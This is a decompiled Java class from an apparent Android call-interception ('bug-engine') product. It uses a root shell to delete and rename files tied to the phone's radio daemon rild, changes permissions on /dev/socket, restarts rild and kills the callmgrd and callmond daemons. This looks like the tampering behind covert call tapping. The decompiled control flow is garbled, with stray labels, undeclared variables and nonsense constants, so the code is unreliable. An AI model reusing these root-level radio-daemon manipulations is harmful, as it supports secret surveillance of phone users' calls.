package com.vvt.callmanager.ref;

import com.vvt.shell.CannotGetRootShellException;
import com.vvt.shell.LinuxFile;
import com.vvt.shell.f;
import com.vvt.shell.j;
import java.util.ArrayList;
import java.util.Iterator;

public class a
  extends com.fx.daemon.a
{
  private static final boolean a = g.a;
  private static final boolean b = g.b;
  private static final boolean c = g.e;
  
  public static void e()
  {
    int i = 0;
    float f1 = 0.0F;
    Object localObject1 = null;
    int k = 1;
    float f2 = Float.MIN_VALUE;
    boolean bool1 = a;
    if (bool1) {}
    Object localObject2 = new Object[k];
    Object localObject3 = b.e;
    localObject2[0] = localObject3;
    Object localObject4 = LinuxFile.a(String.format("%s*", (Object[])localObject2));
    Object localObject5 = ((ArrayList)localObject4).iterator();
    boolean bool2 = false;
    localObject3 = null;
    int m = 0;
    localObject2 = null;
    float f3 = 0.0F;
    int n = 0;
    bool1 = ((Iterator)localObject5).hasNext();
    Object localObject6;
    String str1;
    if (bool1)
    {
      localObject4 = (LinuxFile)((Iterator)localObject5).next();
      localObject6 = "rild";
      str1 = ((LinuxFile)localObject4).c();
      boolean bool3 = ((String)localObject6).equals(str1);
      if (bool3)
      {
        localObject3 = localObject4;
        n = k;
      }
      localObject6 = b.d;
      str1 = ((LinuxFile)localObject4).c();
      bool3 = ((String)localObject6).equals(str1);
      if (!bool3) {
        break label569;
      }
      i = k;
    }
    for (f1 = f2;; f1 = f3)
    {
      m = i;
      f3 = f1;
      localObject1 = localObject4;
      break;
      if ((n == 0) && (m == 0))
      {
        bool1 = a;
        if (bool1) {}
        return;
      }
      localObject5 = f.b();
      if ((n != 0) && (localObject3 != null))
      {
        bool1 = ((LinuxFile)localObject3).a();
        if (bool1)
        {
          bool1 = ((LinuxFile)localObject3).b();
          if (bool1)
          {
            bool1 = k;
            label240:
            if (bool1)
            {
              localObject6 = new Object[k];
              str1 = b.e;
              localObject6[0] = str1;
              localObject3 = String.format("rm %s", (Object[])localObject6);
              ((f)localObject5).a((String)localObject3);
              bool2 = b;
              if (!bool2) {}
            }
          }
        }
      }
      for (;;)
      {
        if ((m != 0) && (localObject1 != null))
        {
          m = ((LinuxFile)localObject1).a();
          if (m == 0) {
            break label483;
          }
          i = ((LinuxFile)localObject1).b();
          if (i == 0) {
            break label483;
          }
          i = k;
          f1 = f2;
          label323:
          if ((n == 0) || (bool1)) {
            break label492;
          }
          bool1 = k;
          label336:
          if ((i == 0) && (!bool1)) {
            break label501;
          }
          localObject1 = new Object[k];
          localObject2 = b.f;
          localObject1[0] = localObject2;
          localObject4 = String.format("rm %s", (Object[])localObject1);
          ((f)localObject5).a((String)localObject4);
          bool1 = b;
          if (!bool1) {}
        }
        for (;;)
        {
          localObject1 = new Object[k];
          String str2 = "/dev/socket";
          localObject1[0] = str2;
          localObject4 = String.format("chmod 755 %s", (Object[])localObject1);
          ((f)localObject5).a((String)localObject4);
          bool1 = b;
          if (bool1) {}
          bool1 = com.vvt.e.a.e();
          if (bool1)
          {
            bool1 = b;
            if (bool1) {}
            localObject4 = "/system/bin/rild";
            j.b((String)localObject4);
          }
          ((f)localObject5).d();
          bool1 = a;
          if (!bool1) {
            break;
          }
          break;
          bool1 = false;
          localObject4 = null;
          break label240;
          label483:
          i = 0;
          localObject1 = null;
          f1 = 0.0F;
          break label323;
          label492:
          bool1 = false;
          localObject4 = null;
          break label336;
          label501:
          j = 2;
          f1 = 2.8E-45F;
          localObject1 = new Object[j];
          localObject2 = b.f;
          localObject1[0] = localObject2;
          localObject2 = b.e;
          localObject1[k] = localObject2;
          localObject4 = String.format("mv %s %s", (Object[])localObject1);
          ((f)localObject5).a((String)localObject4);
          bool1 = b;
          if (!bool1) {}
        }
        bool1 = false;
        localObject4 = null;
      }
      label569:
      localObject4 = localObject1;
      int j = m;
    }
  }
  
  public String a()
  {
    return "bug-engine";
  }
  
  public String b()
  {
    return d.a;
  }
  
  public void d()
  {
    bool = a;
    if (bool) {}
    try
    {
      bool = a;
      if (bool) {}
      e();
    }
    catch (CannotGetRootShellException localCannotGetRootShellException)
    {
      for (;;)
      {
        String str;
        bool = c;
        if (!bool) {}
      }
    }
    j.b("callmgrd");
    str = "callmond";
    j.b(str);
    bool = a;
    if (bool) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/ref/getInstance.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */